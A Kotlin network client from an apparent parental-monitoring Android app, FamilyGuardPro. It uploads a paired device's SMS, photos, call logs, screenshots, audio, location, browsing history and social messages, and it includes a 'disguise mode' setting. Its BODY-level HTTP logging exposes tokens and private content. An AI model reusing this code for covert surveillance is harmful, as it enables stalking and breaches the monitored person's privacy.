package com.familyguardpro.network

import android.content.Context
import com.familyguardpro.FamilyGuardApp
import com.familyguardpro.models.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.MultipartBody
import okhttp3.OkHttpClient
import okhttp3.RequestBody.Companion.asRequestBody
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.logging.HttpLoggingInterceptor
import org.json.JSONArray
import org.json.JSONObject
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.io.File
import java.util.concurrent.TimeUnit

object ApiClient {
    
    private lateinit var retrofit: Retrofit
    private lateinit var apiService: ApiService
    private lateinit var okHttpClient: OkHttpClient
    
    fun init(context: Context) {
        val loggingInterceptor = HttpLoggingInterceptor().apply {
            level = HttpLoggingInterceptor.Level.BODY
        }
        
        okHttpClient = OkHttpClient.Builder()
            .addInterceptor(loggingInterceptor)
            .addInterceptor { chain ->
                val original = chain.request()
                val token = FamilyGuardApp.instance.getAuthToken()
                
                val request = if (token != null) {
                    original.newBuilder()
                        .header("Authorization", "Bearer $token")
                        .header("Content-Type", "application/json")
                        .build()
                } else {
                    original.newBuilder()
                        .header("Content-Type", "application/json")
                        .build()
                }
                
                chain.proceed(request)
            }
            .connectTimeout(30, TimeUnit.SECONDS)
            .readTimeout(60, TimeUnit.SECONDS)
            .writeTimeout(60, TimeUnit.SECONDS)
            .build()
        
        retrofit = Retrofit.Builder()
            .baseUrl(FamilyGuardApp.BASE_URL)
            .client(okHttpClient)
            .addConverterFactory(GsonConverterFactory.create())
            .build()
        
        apiService = retrofit.create(ApiService::class.java)
    }
    
    fun getApiService(): ApiService = apiService
    
    fun getOkHttpClient(): OkHttpClient = okHttpClient
    
    // Auth APIs
    suspend fun login(email: String, password: String): Result<AuthResponse> {
        return try {
            val body = mapOf("email" to email, "password" to password)
            val response = apiService.login(body)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                val errorBody = response.errorBody()?.string() ?: "Login failed"
                Result.failure(Exception(errorBody))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun register(email: String, password: String, name: String): Result<AuthResponse> {
        return try {
            val body = mapOf("email" to email, "password" to password, "name" to name)
            val response = apiService.register(body)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                val errorBody = response.errorBody()?.string() ?: "Registration failed"
                Result.failure(Exception(errorBody))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Pairing APIs
    suspend fun generatePairingCode(): Result<PairingResponse> {
        return try {
            val response = apiService.generatePairingCode()
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Failed to generate pairing code"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun verifyPairingCode(code: String, deviceInfo: DeviceInfo): Result<DeviceResponse> {
        return try {
            val body = mapOf(
                "code" to code,
                "deviceId" to deviceInfo.androidId,
                "name" to deviceInfo.deviceName,
                "model" to deviceInfo.deviceModel,
                "androidVersion" to deviceInfo.androidVersion
            )
            val response = apiService.verifyPairingCode(body)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                val errorBody = response.errorBody()?.string() ?: "Invalid pairing code"
                Result.failure(Exception(errorBody))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Device APIs
    suspend fun getDevices(): Result<List<Device>> {
        return try {
            val response = apiService.getDevices()
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Failed to get devices"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getDevice(deviceId: String): Result<Device> {
        return try {
            val response = apiService.getDevice(deviceId)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Device not found"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Sync APIs
    suspend fun syncData(syncData: SyncData): Result<SyncResponse> {
        return try {
            val response = apiService.syncData(syncData)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                val errorBody = response.errorBody()?.string() ?: "Sync failed"
                Result.failure(Exception(errorBody))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun updateFcmToken(deviceId: String, fcmToken: String): Result<Boolean> {
        return try {
            val body = mapOf("fcmToken" to fcmToken)
            val response = apiService.updateFcmToken(deviceId, body)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Notification APIs
    suspend fun uploadNotification(notification: NotificationData): Result<Boolean> {
        return try {
            val response = apiService.uploadNotification(notification)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun getNotifications(deviceId: String, page: Int = 1, limit: Int = 50): Result<NotificationListResponse> {
        return try {
            val response = apiService.getNotifications(deviceId, page, limit)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Failed to get notifications"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Call log APIs
    suspend fun getCallLogs(deviceId: String): Result<List<CallLogEntry>> {
        return try {
            val response = apiService.getCallLogs(deviceId)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Failed to get call logs"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    suspend fun deleteCallLogs(deviceId: String): Result<Boolean> {
        return try {
            val response = apiService.deleteCallLogs(deviceId)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Command APIs
    suspend fun sendCommand(deviceId: String, command: String, params: Map<String, Any>? = null): Result<CommandResponse> {
        return try {
            val body = mutableMapOf<String, Any>(
                "command" to command
            )
            params?.let { body.putAll(it) }
            
            val response = apiService.sendCommand(deviceId, body)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Command failed"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // File upload
    suspend fun uploadAudioFile(deviceId: String, file: File, type: String): Result<Boolean> {
        return try {
            val requestFile = file.asRequestBody("audio/mpeg".toMediaType())
            val body = MultipartBody.Part.createFormData("audio", file.name, requestFile)
            val deviceIdBody = deviceId.toRequestBody("text/plain".toMediaType())
            val typeBody = type.toRequestBody("text/plain".toMediaType())
            
            val response = apiService.uploadAudio(deviceIdBody, typeBody, body)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Location APIs
    suspend fun getLocation(deviceId: String): Result<LocationData> {
        return try {
            val response = apiService.getLocation(deviceId)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Location not found"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Stream status
    suspend fun notifyStreamStatus(deviceId: String, streamType: String, status: String): Result<Boolean> {
        return try {
            val body = mapOf(
                "deviceId" to deviceId,
                "streamType" to streamType,
                "status" to status
            )
            val response = apiService.notifyStreamStatus(body)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Location update
    suspend fun updateLocation(deviceId: String, latitude: Double, longitude: Double): Result<Boolean> {
        return try {
            val body = mapOf(
                "deviceId" to deviceId,
                "latitude" to latitude,
                "longitude" to longitude,
                "timestamp" to System.currentTimeMillis()
            )
            val response = apiService.updateLocation(deviceId, body)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Get device location
    suspend fun getDeviceLocation(deviceId: String): Result<LocationData> {
        return try {
            val response = apiService.getLocation(deviceId)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!)
            } else {
                Result.failure(Exception("Location not found"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Get notifications - simplified version
    suspend fun getNotifications(deviceId: String): Result<List<NotificationData>> {
        return try {
            val response = apiService.getNotifications(deviceId, 1, 100)
            if (response.isSuccessful && response.body() != null) {
                Result.success(response.body()!!.notifications)
            } else {
                Result.failure(Exception("Failed to get notifications"))
            }
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Update permissions
    suspend fun updatePermissions(deviceId: String, permissions: Map<String, Boolean>): Result<Boolean> {
        return try {
            val response = apiService.updatePermissions(deviceId, permissions)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Report app change
    suspend fun reportAppChange(deviceId: String, data: Map<String, Any>): Result<Boolean> {
        return try {
            val response = apiService.reportAppChange(deviceId, data)
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Sync SMS messages
    suspend fun syncSms(deviceId: String, messages: List<SmsData>): Result<Boolean> {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/sync/sms")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(JSONObject().apply {
                    put("messages", JSONArray().apply {
                        messages.forEach { sms ->
                            put(JSONObject().apply {
                                put("address", sms.address)
                                put("contactName", sms.contactName)
                                put("body", sms.body)
                                put("type", sms.type)
                                put("date", sms.date)
                                put("read", sms.read)
                            })
                        }
                    })
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Sync photos with thumbnails - syncs in batches until quota is full
    suspend fun syncPhotos(deviceId: String, photos: List<PhotoData>, context: Context): Result<Boolean> {
        return try {
            val batchSize = 20 // Sync 20 photos per batch
            var totalSynced = 0
            var quotaFull = false
            var totalSkippedNoThumb = 0
            
            android.util.Log.d("ApiClient", "Starting photo sync with ${photos.size} photos")
            
            // Process photos in batches (they're already sorted newest first)
            for (batchStart in photos.indices step batchSize) {
                if (quotaFull) break
                
                val batch = photos.subList(batchStart, minOf(batchStart + batchSize, photos.size))
                
                val jsonPhotos = JSONArray()
                var skippedInBatch = 0
                
                for (photo in batch) {
                    // Read thumbnail
                    val thumbnailBase64 = try {
                        val bitmap = android.provider.MediaStore.Images.Thumbnails.getThumbnail(
                            context.contentResolver,
                            photo.id?.toLongOrNull() ?: 0L,
                            android.provider.MediaStore.Images.Thumbnails.MINI_KIND,
                            null
                        )
                        if (bitmap != null) {
                            val stream = java.io.ByteArrayOutputStream()
                            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
                            val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                            stream.close()
                            bitmap.recycle()
                            base64
                        } else {
                            // Try to load full image and create thumbnail
                            try {
                                val uri = android.net.Uri.parse(photo.uri)
                                val fullBitmap = android.provider.MediaStore.Images.Media.getBitmap(context.contentResolver, uri)
                                if (fullBitmap != null) {
                                    val scaled = android.graphics.Bitmap.createScaledBitmap(fullBitmap, 200, 200, true)
                                    val stream = java.io.ByteArrayOutputStream()
                                    scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, stream)
                                    val base64 = android.util.Base64.encodeToString(stream.toByteArray(), android.util.Base64.NO_WRAP)
                                    stream.close()
                                    fullBitmap.recycle()
                                    scaled.recycle()
                                    base64
                                } else null
                            } catch (e: Exception) {
                                null
                            }
                        }
                    } catch (e: Exception) {
                        android.util.Log.w("ApiClient", "Failed to get thumbnail for ${photo.name}: ${e.message}")
                        null
                    }
                    
                    // Skip photos without thumbnails
                    if (thumbnailBase64 == null) {
                        skippedInBatch++
                        totalSkippedNoThumb++
                        continue
                    }
                    
                    jsonPhotos.put(JSONObject().apply {
                        put("fileName", photo.name)
                        put("filePath", photo.path)
                        put("thumbnail", thumbnailBase64)
                        put("mimeType", "image/jpeg")
                        put("size", photo.size)
                        put("dateTaken", photo.timestamp)
                    })
                }
                
                if (jsonPhotos.length() == 0) {
                    android.util.Log.d("ApiClient", "Batch $batchStart: No valid photos with thumbnails")
                    continue
                }
                
                android.util.Log.d("ApiClient", "Batch $batchStart: Sending ${jsonPhotos.length()} photos (skipped $skippedInBatch)")
                
                val request = okhttp3.Request.Builder()
                    .url("${BASE_URL}api/sync/photos")
                    .header("X-Device-ID", deviceId)
                    .header("Content-Type", "application/json")
                    .post(JSONObject().apply {
                        put("photos", jsonPhotos)
                    }.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                
                val response = okHttpClient.newCall(request).execute()
                
                if (response.isSuccessful) {
                    val responseBody = response.body?.string()
                    val jsonResponse = JSONObject(responseBody ?: "{}")
                    
                    totalSynced += jsonResponse.optInt("count", 0)
                    quotaFull = jsonResponse.optBoolean("quotaFull", false)
                    
                    android.util.Log.d("ApiClient", "Batch synced: ${jsonResponse.optInt("count", 0)} photos, quota full: $quotaFull")
                    
                    if (quotaFull) {
                        android.util.Log.d("ApiClient", "Storage quota full, stopping sync")
                        break
                    }
                } else {
                    android.util.Log.e("ApiClient", "Batch sync failed: ${response.code} - ${response.message}")
                }
            }
            
            android.util.Log.d("ApiClient", "Photo sync complete: $totalSynced synced, $totalSkippedNoThumb skipped (no thumbnail), quota full: $quotaFull")
            Result.success(true)
        } catch (e: Exception) {
            android.util.Log.e("ApiClient", "Error syncing photos", e)
            Result.failure(e)
        }
    }
    
    // Expose the api service for DataSyncWorker
    val api: ApiService
        get() = apiService
    
    // Expose base URL for logging - uses FamilyGuardApp constant
    val BASE_URL: String
        get() = FamilyGuardApp.BASE_URL
    
    // Upload screenshot to server
    suspend fun uploadScreenshot(deviceId: String, base64Image: String, width: Int, height: Int): Result<Boolean> {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/screenshot/upload")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(JSONObject().apply {
                    put("imageData", base64Image)
                    put("width", width)
                    put("height", height)
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Pair device with pairing code (child device)
    suspend fun pairDevice(code: String): Result<DeviceResponse> {
        return try {
            // Get Android ID directly from system
            val androidId = android.provider.Settings.Secure.getString(
                FamilyGuardApp.instance.contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: ""
            
            // Save it for later use
            FamilyGuardApp.instance.preferenceManager.setAndroidId(androidId)
            
            val deviceInfo = DeviceInfo(
                deviceName = android.os.Build.MODEL,
                deviceModel = android.os.Build.MODEL,
                androidVersion = android.os.Build.VERSION.RELEASE,
                androidId = androidId
            )
            verifyPairingCode(code, deviceInfo)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // Update disguise mode
    suspend fun updateDisguiseMode(deviceId: String, mode: String): Result<Boolean> {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/disguise")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .put(JSONObject().apply {
                    put("disguiseMode", mode)
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
    
    // ============== Geofencing APIs ==============
    
    suspend fun getGeofences(deviceId: String): List<com.familyguardpro.services.GeofenceService.GeofenceZone> {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/geofences")
                .header("X-Device-ID", deviceId)
                .get()
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            val geofences = mutableListOf<com.familyguardpro.services.GeofenceService.GeofenceZone>()
            
            if (response.isSuccessful) {
                val json = JSONArray(response.body?.string() ?: "[]")
                for (i in 0 until json.length()) {
                    val obj = json.getJSONObject(i)
                    geofences.add(com.familyguardpro.services.GeofenceService.GeofenceZone(
                        id = obj.getString("id"),
                        name = obj.getString("name"),
                        latitude = obj.getDouble("latitude"),
                        longitude = obj.getDouble("longitude"),
                        radius = obj.getDouble("radius").toFloat()
                    ))
                }
            }
            
            geofences
        } catch (e: Exception) {
            emptyList()
        }
    }
    
    suspend fun reportGeofenceEvent(
        deviceId: String,
        zoneId: String,
        zoneName: String,
        event: String,
        timestamp: Long
    ) {
        try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/geofence-event")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(JSONObject().apply {
                    put("zoneId", zoneId)
                    put("zoneName", zoneName)
                    put("event", event)
                    put("timestamp", timestamp)
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            okHttpClient.newCall(request).execute()
        } catch (e: Exception) {
            // Silent fail
        }
    }
    
    // ============== Screen Time APIs ==============
    
    suspend fun getScreenTimeLimits(deviceId: String): JSONObject {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/screen-time-limits")
                .header("X-Device-ID", deviceId)
                .get()
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            if (response.isSuccessful) {
                JSONObject(response.body?.string() ?: "{}")
            } else {
                JSONObject()
            }
        } catch (e: Exception) {
            JSONObject()
        }
    }
    
    suspend fun reportScreenTime(deviceId: String, usageData: JSONObject) {
        try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/screen-time")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(usageData.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            okHttpClient.newCall(request).execute()
        } catch (e: Exception) {
            // Silent fail
        }
    }
    
    // ============== Browser History APIs ==============
    
    suspend fun syncBrowserHistory(deviceId: String, history: JSONArray) {
        try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/sync/browser-history")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(JSONObject().apply {
                    put("history", history)
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            okHttpClient.newCall(request).execute()
        } catch (e: Exception) {
            // Silent fail
        }
    }
    
    // ============== Keyword Alert APIs ==============
    
    suspend fun getCustomKeywords(deviceId: String): JSONArray {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/keywords")
                .header("X-Device-ID", deviceId)
                .get()
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            if (response.isSuccessful) {
                JSONArray(response.body?.string() ?: "[]")
            } else {
                JSONArray()
            }
        } catch (e: Exception) {
            JSONArray()
        }
    }
    
    suspend fun reportKeywordAlerts(deviceId: String, alerts: JSONArray) {
        try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/devices/$deviceId/keyword-alerts")
                .header("X-Device-ID", deviceId)
                .header("Content-Type", "application/json")
                .post(JSONObject().apply {
                    put("alerts", alerts)
                }.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            okHttpClient.newCall(request).execute()
        } catch (e: Exception) {
            // Silent fail
        }
    }
    
    /**
     * Upload a SENT social media message directly via HTTP API
     * Used as fallback when WebSocket may not have parentId
     */
    suspend fun uploadSocialMessage(messageData: JSONObject): Boolean {
        return try {
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/social-media/message")
                .header("Content-Type", "application/json")
                .post(messageData.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            response.isSuccessful
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Confirm Device Owner provisioning with the server.
     * Called after QR/ADB provisioning is verified on the child device.
     */
    suspend fun confirmDeviceOwnerProvisioning(
        deviceId: String,
        parentUserId: String,
        method: String
    ): Result<Boolean> {
        return try {
            val jsonBody = org.json.JSONObject().apply {
                put("deviceId", deviceId)
                put("parentUserId", parentUserId)
                put("method", method)
            }
            val request = okhttp3.Request.Builder()
                .url("${BASE_URL}api/device-owner/confirm-provisioning")
                .header("Content-Type", "application/json")
                .post(jsonBody.toString().toRequestBody("application/json".toMediaType()))
                .build()
            
            val response = okHttpClient.newCall(request).execute()
            Result.success(response.isSuccessful)
        } catch (e: Exception) {
            Result.failure(e)
        }
    }
}
